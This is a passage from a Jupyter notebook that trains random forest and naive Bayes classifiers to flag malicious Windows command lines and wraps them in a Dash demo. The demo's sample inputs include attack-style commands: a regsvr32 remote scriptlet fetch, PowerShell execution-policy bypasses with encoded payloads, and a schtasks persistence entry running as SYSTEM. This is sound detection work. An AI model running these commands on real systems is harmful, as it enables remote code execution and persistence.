      "Fitting model 18\n",
      "Fitting model 19\n",
      "Fitting model 20\n",
      "Fitting model 21\n",
      "Fitting model 22\n",
      "Fitting model 23\n",
      "Fitting model 24\n",
      "Fitting model 25\n",
      "Fitting model 26\n",
      "CPU times: user 745 ms, sys: 272 ms, total: 1.02 s\n",
      "Wall time: 8min 47s\n"
     ]
    }
   ],
   "source": [
    "%%time\n",
    "models = []\n",
    "for grid in range(len(paramGrid)):\n",
    "    print(\"Fitting model {}\".format(grid))\n",
    "    _model = rf_estimator.fit(validation_df, paramGrid[grid])\n",
    "    models.append(_model)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {},
   "outputs": [],
   "source": [
    "evaluator = BinaryClassificationEvaluator(labelCol='class_label', metricName='areaUnderROC')\n",
    "auc_scores = [evaluator.evaluate(model.transform(validation_df)) for model in models]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[0.9908053299767449,\n",
       " 0.9924531249148592,\n",
       " 0.9949516461148276,\n",
       " 0.9902868417977608,\n",
       " 0.9925394765441427,\n",
       " 0.9933807427239103,\n",
       " 0.9914499021297748,\n",
       " 0.993149538317722,\n",
       " 0.9942604546772764,\n",
       " 0.9873545947543013,\n",
       " 0.9898357094032308,\n",
       " 0.9911019981509701,\n",
       " 0.9883429841306746,\n",
       " 0.9909370900000424,\n",
       " 0.9914223543707396,\n",
       " 0.9852508995402856,\n",
       " 0.9901214038822361,\n",
       " 0.9904204181568188,\n",
       " 0.9857429751700846,\n",
       " 0.9902126747542043,\n",
       " 0.9902354546318681,\n",
       " 0.9830885518173347,\n",
       " 0.9885918978105284,\n",
       " 0.9928943431433628,\n",
       " 0.9867593663894333,\n",
       " 0.9889687874808453,\n",
       " 0.9905599732877555]"
      ]
     },
     "execution_count": 58,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "auc_scores"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best params: \n",
      "\n",
      "{Param(parent='CountVectorizer_21a0df430785', name='minDF', doc='Specifies the minimum number of different documents a term must appear in to be included in the vocabulary. If this is an integer >= 1, this specifies the number of documents the term must appear in; if this is a double in [0,1), then this specifies the fraction of documents. Default 1.0'): 3.0, Param(parent='RandomForestClassifier_2d1b3e0e7989', name='numTrees', doc='Number of trees to train (>= 1)'): 300, Param(parent='RandomForestClassifier_2d1b3e0e7989', name='maxDepth', doc='Maximum depth of the tree. (>= 0) E.g., depth 0 means 1 leaf node; depth 1 means 1 internal node + 2 leaf nodes.'): 20}\n",
      "\n",
      "Best Validation AUC: \n",
      "\n",
      "0.9949516461148276\n"
     ]
    }
   ],
   "source": [
    "best_model_idx = np.argmax(auc_scores)\n",
    "best_model = models[best_model_idx]\n",
    "print(\"Best params: \\n\\n{}\\n\".format(paramGrid[best_model_idx]))\n",
    "print(\"Best Validation AUC: \\n\\n{}\".format(auc_scores[best_model_idx]))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Best model\n",
    "+ minDF: 3\n",
    "+ numTrees: 500\n",
    "+ maxDepth: 20"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>token</th>\n",
       "      <th>importance</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>111</th>\n",
       "      <td>bypass</td>\n",
       "      <td>0.070698</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>115</th>\n",
       "      <td>-executionpolicy</td>\n",
       "      <td>0.061350</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>109</th>\n",
       "      <td>-c</td>\n",
       "      <td>0.057549</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>162</th>\n",
       "      <td>net</td>\n",
       "      <td>0.035840</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>170</th>\n",
       "      <td>/c</td>\n",
       "      <td>0.027415</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>193</th>\n",
       "      <td>-name</td>\n",
       "      <td>0.026329</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>203</th>\n",
       "      <td>reg</td>\n",
       "      <td>0.025096</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>199</th>\n",
       "      <td>hklm</td>\n",
       "      <td>0.023629</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>184</th>\n",
       "      <td>foreach</td>\n",
       "      <td>0.023023</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>215</th>\n",
       "      <td>-recurse</td>\n",
       "      <td>0.022016</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>182</th>\n",
       "      <td>/s</td>\n",
       "      <td>0.020522</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>210</th>\n",
       "      <td>currentversion</td>\n",
       "      <td>0.020253</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>195</th>\n",
       "      <td>-force</td>\n",
       "      <td>0.019960</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>324</th>\n",
       "      <td>.zip</td>\n",
       "      <td>0.019530</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>190</th>\n",
       "      <td>select-object</td>\n",
       "      <td>0.019451</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>176</th>\n",
       "      <td>-path</td>\n",
       "      <td>0.016075</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>260</th>\n",
       "      <td>wmic</td>\n",
       "      <td>0.015935</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>245</th>\n",
       "      <td>hkcu</td>\n",
       "      <td>0.013081</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>253</th>\n",
       "      <td>/v</td>\n",
       "      <td>0.012473</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>242</th>\n",
       "      <td>select</td>\n",
       "      <td>0.010998</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                token  importance\n",
       "111            bypass    0.070698\n",
       "115  -executionpolicy    0.061350\n",
       "109                -c    0.057549\n",
       "162               net    0.035840\n",
       "170                /c    0.027415\n",
       "193             -name    0.026329\n",
       "203               reg    0.025096\n",
       "199              hklm    0.023629\n",
       "184           foreach    0.023023\n",
       "215          -recurse    0.022016\n",
       "182                /s    0.020522\n",
       "210    currentversion    0.020253\n",
       "195            -force    0.019960\n",
       "324              .zip    0.019530\n",
       "190     select-object    0.019451\n",
       "176             -path    0.016075\n",
       "260              wmic    0.015935\n",
       "245              hkcu    0.013081\n",
       "253                /v    0.012473\n",
       "242            select    0.010998"
      ]
     },
     "execution_count": 60,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "vocab = best_model.stages[0].vocabulary\n",
    "feature_importance = best_model.stages[-1].featureImportances.toArray()\n",
    "best_vocab_importance_df = pd.DataFrame({'token': vocab, 'importance': feature_importance})\n",
    "best_vocab_importance_df.sort_values('importance', ascending=False).head(20)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "DecisionTreeClassificationModel (uid=dtc_8ecad7124bcc) of depth 20 with 41 nodes\n",
      "  If (feature 115 <= 0.5)\n",
      "   If (feature 162 <= 0.5)\n",
      "    If (feature 328 <= 0.5)\n",
      "     If (feature 978 <= 0.5)\n",
      "      If (feature 215 <= 0.5)\n",
      "       If (feature 3 <= 0.5)\n",
      "        If (feature 709 <= 0.5)\n",
      "         If (feature 199 <= 0.5)\n",
      "          If (feature 551 <= 0.5)\n",
      "           If (feature 891 <= 0.5)\n",
      "            If (feature 839 <= 0.5)\n",
      "             If (feature 195 <= 0.5)\n",
      "              If (feature 245 <= 0.5)\n",
      "               If (feature 915 <= 0.5)\n",
      "                If (feature 536 <= 0.5)\n",
      "                 If (feature 1088 <= 0.5)\n",
      "                  If (feature 1105 <= 0.5)\n",
      "                   If (feature 634 <= 0.5)\n",
      "                    If (feature 785 <= 0.5)\n",
      "                     If (feature 691 <= 0.5)\n",
      "                      Predict: 0.0\n",
      "                     Else (feature 691 > 0.5)\n",
      "                      Predict: 1.0\n",
      "                    Else (feature 785 > 0.5)\n",
      "                     Predict: 1.0\n",
      "                   Else (feature 634 > 0.5)\n",
      "                    Predict: 1.0\n",
      "                  Else (feature 1105 > 0.5)\n",
      "                   Predict: 1.0\n",
      "                 Else (feature 1088 > 0.5)\n",
      "                  Predict: 1.0\n",
      "                Else (feature 536 > 0.5)\n",
      "                 Predict: 1.0\n",
      "               Else (feature 915 > 0.5)\n",
      "                Predict: 1.0\n",
      "              Else (feature 245 > 0.5)\n",
      "               Predict: 1.0\n",
      "             Else (feature 195 > 0.5)\n",
      "              Predict: 1.0\n",
      "            Else (feature 839 > 0.5)\n",
      "             Predict: 1.0\n",
      "           Else (feature 891 > 0.5)\n",
      "            Predict: 1.0\n",
      "          Else (feature 551 > 0.5)\n",
      "           Predict: 1.0\n",
      "         Else (feature 199 > 0.5)\n",
      "          Predict: 1.0\n",
      "        Else (feature 709 > 0.5)\n",
      "         Predict: 1.0\n",
      "       Else (feature 3 > 0.5)\n",
      "        Predict: 0.0\n",
      "      Else (feature 215 > 0.5)\n",
      "       Predict: 1.0\n",
      "     Else (feature 978 > 0.5)\n",
      "      Predict: 1.0\n",
      "    Else (feature 328 > 0.5)\n",
      "     Predict: 1.0\n",
      "   Else (feature 162 > 0.5)\n",
      "    Predict: 1.0\n",
      "  Else (feature 115 > 0.5)\n",
      "   Predict: 1.0\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(best_model.stages[-1].trees[2].toDebugString)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# RF Cross Validation\n",
    "---\n",
    "+ test best_model performance on training dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.9943364565224599"
      ]
     },
     "execution_count": 63,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "evaluator.evaluate(best_model.transform(testing_df))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {},
   "outputs": [],
   "source": [
    "best_model_df = best_model.transform(testing_df)\n",
    "tp = best_model_df.filter((best_model_df.class_label == 1) & (best_model_df.prediction == 1)).count()\n",
    "tn = best_model_df.filter((best_model_df.class_label == 0) & (best_model_df.prediction == 0)).count()\n",
    "fp = best_model_df.filter((best_model_df.class_label == 0) & (best_model_df.prediction == 1)).count()\n",
    "fn = best_model_df.filter((best_model_df.class_label == 1) & (best_model_df.prediction == 0)).count()\n",
    "recall = tp / (tp + fn)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.3719512195121951"
      ]
     },
     "execution_count": 65,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "recall"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 66,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>predicted_0</th>\n",
       "      <th>predicted_1</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>actual_0</th>\n",
       "      <td>5149</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>actual_1</th>\n",
       "      <td>103</td>\n",
       "      <td>61</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "          predicted_0  predicted_1\n",
       "actual_0         5149            0\n",
       "actual_1          103           61"
      ]
     },
     "execution_count": 66,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pd.DataFrame(data=[[tn,fp],[fn,tp]], index=['actual_0', 'actual_1'], columns=['predicted_0', 'predicted_1'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Naive Bayes Modeling\n",
    "---"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "metadata": {},
   "outputs": [],
   "source": [
    "nb = NaiveBayes(featuresCol='tf', labelCol='class_label', smoothing=1, modelType='bernoulli')\n",
    "nb_estimator = Pipeline(stages=[cv_transformer, nb])\n",
    "nb_model = nb_estimator.fit(training_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Row(accuracy=0.8784114436288349)"
      ]
     },
     "execution_count": 68,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "nb_model.transform(testing_df).\\\n",
    "    select(F.avg(F.expr('float(class_label = prediction)')).alias('accuracy')).\\\n",
    "    first()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# NB Model Tuning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "metadata": {},
   "outputs": [],
   "source": [
    "nb_paramGrid = (ParamGridBuilder() \n",
    "                 .addGrid(nb_model.stages[0].minDF, [1, 5, 10, 20, 50, 75, 100]) \n",
    "                 .build()\n",
    "            )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 74,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Fitting model 0\n",
      "Fitting model 1\n",
      "Fitting model 2\n",
      "Fitting model 3\n",
      "Fitting model 4\n",
      "Fitting model 5\n",
      "Fitting model 6\n"
     ]
    }
   ],
   "source": [
    "nb_models = []\n",
    "for grid in range(len(nb_paramGrid)):\n",
    "    print(\"Fitting model {}\".format(grid))\n",
    "    _model = nb_estimator.fit(validation_df, paramGrid[grid])\n",
    "    nb_models.append(_model)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 75,
   "metadata": {},
   "outputs": [],
   "source": [
    "evaluator = BinaryClassificationEvaluator(labelCol='class_label', metricName='areaUnderROC')\n",
    "nb_auc_scores = [evaluator.evaluate(model.transform(validation_df)) for model in nb_models]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 76,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[0.8603672963902749,\n",
       " 0.8603672963902749,\n",
       " 0.8603672963902749,\n",
       " 0.8603672963902749,\n",
       " 0.8603672963902749,\n",
       " 0.8603672963902749,\n",
       " 0.860367296390275]"
      ]
     },
     "execution_count": 76,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "nb_auc_scores"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 77,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best params: \n",
      "\n",
      "{Param(parent='CountVectorizer_21a0df430785', name='minDF', doc='Specifies the minimum number of different documents a term must appear in to be included in the vocabulary. If this is an integer >= 1, this specifies the number of documents the term must appear in; if this is a double in [0,1), then this specifies the fraction of documents. Default 1.0'): 3.0, Param(parent='RandomForestClassifier_2d1b3e0e7989', name='numTrees', doc='Number of trees to train (>= 1)'): 300, Param(parent='RandomForestClassifier_2d1b3e0e7989', name='maxDepth', doc='Maximum depth of the tree. (>= 0) E.g., depth 0 means 1 leaf node; depth 1 means 1 internal node + 2 leaf nodes.'): 20}\n",
      "\n",
      "Best AUC: \n",
      "\n",
      "0.8603672963902749\n"
     ]
    }
   ],
   "source": [
    "nb_best_model_idx = np.argmax(auc_scores)\n",
    "nb_best_model = nb_models[nb_best_model_idx]\n",
    "print(\"Best params: \\n\\n{}\\n\".format(paramGrid[nb_best_model_idx]))\n",
    "print(\"Best AUC: \\n\\n{}\".format(nb_auc_scores[nb_best_model_idx]))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### NB Best model\n",
    "+ minDF: 50"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# NB Cross Validation\n",
    "+ test best_model performance on training dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 78,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.8871134106077901"
      ]
     },
     "execution_count": 78,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "evaluator.evaluate(nb_best_model.transform(testing_df))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 79,
   "metadata": {},
   "outputs": [],
   "source": [
    "nb_best_model_df = nb_best_model.transform(testing_df)\n",
    "tp = nb_best_model_df.filter((nb_best_model_df.class_label == 1) & (nb_best_model_df.prediction == 1)).count()\n",
    "tn = nb_best_model_df.filter((nb_best_model_df.class_label == 0) & (nb_best_model_df.prediction == 0)).count()\n",
    "fp = nb_best_model_df.filter((nb_best_model_df.class_label == 0) & (nb_best_model_df.prediction == 1)).count()\n",
    "fn = nb_best_model_df.filter((nb_best_model_df.class_label == 1) & (nb_best_model_df.prediction == 0)).count()\n",
    "nb_recall = tp / (tp + fn)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 80,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.9878048780487805"
      ]
     },
     "execution_count": 80,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "nb_recall"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 81,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>predicted_0</th>\n",
       "      <th>predicted_1</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>actual_0</th>\n",
       "      <td>4842</td>\n",
       "      <td>307</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>actual_1</th>\n",
       "      <td>2</td>\n",
       "      <td>162</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "          predicted_0  predicted_1\n",
       "actual_0         4842          307\n",
       "actual_1            2          162"
      ]
     },
     "execution_count": 81,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pd.DataFrame(data=[[tn,fp],[fn,tp]], index=['actual_0', 'actual_1'], columns=['predicted_0', 'predicted_1'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Plotly Dash Code (LR model)\n",
    "---"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 82,
   "metadata": {},
   "outputs": [],
   "source": [
    "common_strings = ['windows', 'system32', 'cmd.exe', 'sandcat.exe', 'c', 'windowspowershell', 'v1.0', 'powershell.exe', '']\n",
    "\n",
    "import re\n",
    "def demo_clean_input(s):\n",
    "    pattern = re.compile(r\"\"\"\n",
    "        [:|\"?']\n",
    "        | --field-trial-handle=.*\\d+\n",
    "        | //.*com(/.*)/\n",
    "        | \\s*\"\\s*\n",
    "        | \\{.*\\}\n",
    "        | [=;(),]\n",
    "        | \\\\\n",
    "        | //\n",
    "        | \\s+\\.\\s+ \n",
    "        | $.\n",
    "        | $_.\n",
    "        | (>>)\n",
    "    \"\"\", re.VERBOSE)\n",
    "    \n",
    "    return ','.join([x.lower() for x in re.sub(pattern, ' ', s).split() if x.lower() not in common_strings and len(x) >= 2])\n",
    "\n",
    "# demo_clean_input(\"C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s NetSetupSvc\")\n",
    "# demo_clean_input(r'//download.sysinternals.com/files/pstools.zip')\n",
    "# demo_clean_input(r'C:\\Windows\\system32\\regsvr32.exe\" \"C:\\Windows\\system32\\regsvr32.exe\" /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll')\n",
    "# demo_clean_input(r'powershell.exe -ExecutionPolicy Bypass -C \"Get-WmiObject -Class Win32_UserAccount\"')\n",
    "# demo_clean_input(r'powershell.exe -ExecutionPolicy Bypass -C \"start powershell.exe -ArgumentList \\\"-NoP\\\",\\\"-StA\\\",\\\"-ExecutionPolicy\\\",\\\"bypass\\\",\\\".\\Emulate-Administrator-Tasks.ps1\\\"\"')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 83,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_coefs(tokens):\n",
    "    \"\"\" get the coefficient for tokens passed from GUI and returns as string \"\"\"\n",
    "    \n",
    "    _format = \"{}: *{:.2f}*\\n\"\n",
    "    s = \"\"\n",
    "\n",
    "    token_coefs = []\n",
    "    for token in tokens.split(','):\n",
    "        try:\n",
    "            weight = round(best_model_word_coefs.loc[best_model_word_coefs.loc[:, 'token'] == token, 'weight'].values[0], 2)\n",
    "            s += _format.format(token, weight)\n",
    "        except:\n",
    "            weight = 0.0  # token is not in vocabulary, therefore return 0 for weight\n",
    "            s += _format.format(token, weight)   \n",
    "    return s\n",
    "\n",
    "# get_coefs('cmd.exe,/c,/t')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 84,
   "metadata": {},
   "outputs": [],
   "source": [
    "def spark_code(s):\n",
    "    \"\"\" tokenizes the input and calls the existing feature and prediction pipelines to transform the input \"\"\"\n",
    "    \n",
    "    # create tokens\n",
    "    tokens = demo_clean_input(s)\n",
    "    print(tokens)\n",
    "    \n",
    "    # create dataframe\n",
    "    _schema = T.StructType([\n",
    "        T.StructField('cmd_line_tokens', T.StringType(), True)\n",
    "    ])         \n",
    "    myrow = Row(cmd_line_tokens=tokens)\n",
    "    text_df = spark.createDataFrame([myrow], schema=_schema)\n",
    "    text_df = text_df.select(\n",
    "        '*'\n",
    "    ).withColumn(\n",
    "        'cmd_line_tokens', F.split(col('cmd_line_tokens'), ',')\n",
    "    )\n",
    "    \n",
    "    #transform features using existing pipelines\n",
    "    features = best_model.transform(text_df)\n",
    "    \n",
    "    _features = features.select('cmd_line_tokens').rdd.take(1)[0]['cmd_line_tokens']\n",
    "    prediction = features.select('prediction').rdd.take(1)[0]['prediction']\n",
    "    probability = features.select('probability').rdd.take(1)[0]['probability']\n",
    "    \n",
    "    coefs = get_coefs(tokens)\n",
    "    \n",
    "    result = \"\"\"\n",
    "    Tokens: {} \\n \n",
    "    Probability: {} \\n \n",
    "    Prediction: {} \\n \n",
    "    {}\n",
    "    \"\"\"\n",
    "    \n",
    "    if prediction == 0.0:\n",
    "        return result.format(_features, probability, prediction, \"*** Benign ***\"), coefs\n",
    "    else:\n",
    "        return result.format(_features, probability, prediction, \"*** Malicious ***\"), coefs\n",
    "                         \n",
    "# spark_code('C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s NetSetupSvc /c')\n",
    "# spark_code(r'\"powershell.exe -ExecutionPolicy Bypass -C \"\"Compress-Archive -Path C:\\Users\\win10-user3\\staged-DestinationPath C:\\Users\\win10-user3\\staged.zip -Force;ls C:\\Users\\win10-user3\\staged.zip | foreach {$_.FullName} | select')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import dash\n",
    "import dash_table\n",
    "import dash_core_components as dcc\n",
    "import dash_html_components as html\n",
    "from jupyterlab_dash import AppViewer\n",
    "from dash.dependencies import Input, Output\n",
    "\n",
    "external_stylesheets = ['https://codepen.io/chriddyp/pen/bWLwgP.css']\n",
    "\n",
    "viewer = AppViewer()\n",
    "\n",
    "app = dash.Dash(name=__name__, external_stylesheets=external_stylesheets)\n",
    "\n",
    "markdown_text = '''\n",
    "### Windows process command-line classifier (Logistic Regression)\n",
    "Please copy and paste your log in the box below\n",
    "'''\n",
    "\n",
    "sample_input_data = r'''\n",
    "### Example malicious logs \n",
    "+ C:\\Windows\\system32\\regsvr32.exe\" /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll\n",
    "+ powershell.exe -ExecutionPolicy Bypass -C \"New-Item -Path \\\".\\\" -Name \\\"staged\\\" -ItemType \\\"directory\\\" -Force | foreach {$_.FullName} | Select-Object\"\n",
    "+ cmd.exe /C \"net share\"\n",
    "powershell.exe -ExecutionPolicy Bypass -C \"start powershell.exe -ArgumentList \\\"-NoP\\\",\\\"-StA\\\",\\\"-ExecutionPolicy\\\",\\\"bypass\\\",\\\".\\Emulate-Administrator-Tasks.ps1\\\"\"\n",
    "### Example benign logs \n",
    "+ C:\\Windows\\system32\\dllhost.exe /Processid:{B2FEB3AD-8AE6-42E7-B2E4-60609573B404}\n",
    "+ C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s SENS \n",
    "+ C:\\Windows\\System32\\Upfc.exe /launchtype boot /cv 09o3CnnAskG8AMTNUwkQhQ.0\n",
    "### Example logs not in dataset\n",
    "+ cmd.exe /c schtasks /create /tn \"Resume Viewer Update Checker\" /tr \"powershell.exe -nop -exec bypass -EncodedCommand $pcode\" /sc ONLOGON /RU SYSTEM'\n",
    "+ cmd.exe /c dir /s /b \\\\\\\\FILE001\\\\secrets\n",
    "+ C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\" -nop -exec bypass -EncodedCommand SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQA\n",
    "+ cmd.exe /c reg query \"\\\\\\\\\\\\\\\\FILE001\\\\secrets\\\\hklm\\\\system\\\\currentcontrolset\\\\control\\\\terminal server\n",
    "'''\n",
    "\n",
    "app.layout = html.Div([\n",
    "    html.Div([\n",
    "        html.Div([\n",
    "            dcc.Markdown(children=markdown_text),\n",
    "            dcc.Textarea(id='input', value='C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s NetSetupSvc', style={'height': '50px', 'width': '50%'}),\n",
    "            \n",
    "        html.Div([html.Button(children='Submit', id='button', n_clicks=0)], style={'margin': '2px'}),\n",
    "            \n",
    "        html.Div([\n",
    "            dcc.Textarea(id='output', value='', style={'height': '175px', 'width': '50%'}),\n",
    "            dcc.Textarea(id='coefs', value='', style={'height': '175px', 'width': '25%'})\n",
    "        ]),\n",
    "            dcc.Markdown(children=sample_input_data)\n",
    "        ])\n",
    "    ])\n",
    "])\n",
    "    \n",
    "@app.callback(\n",
    "    [Output(component_id='output', component_property='value'),  # set output component on reactive change\n",
    "    Output(component_id='coefs', component_property='value')],\n",
    "    [Input(component_id='button', component_property='n_clicks')],  #  reactive input comes from button press\n",
    "    [dash.dependencies.State('input', 'value')]\n",
    ")\n",
    "def on_click(n_clicks, value):\n",
    "    # call pyspark logic from here\n",
    "    return spark_code(value)\n",
    "    \n",
    "\n",
    "viewer.show(app)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
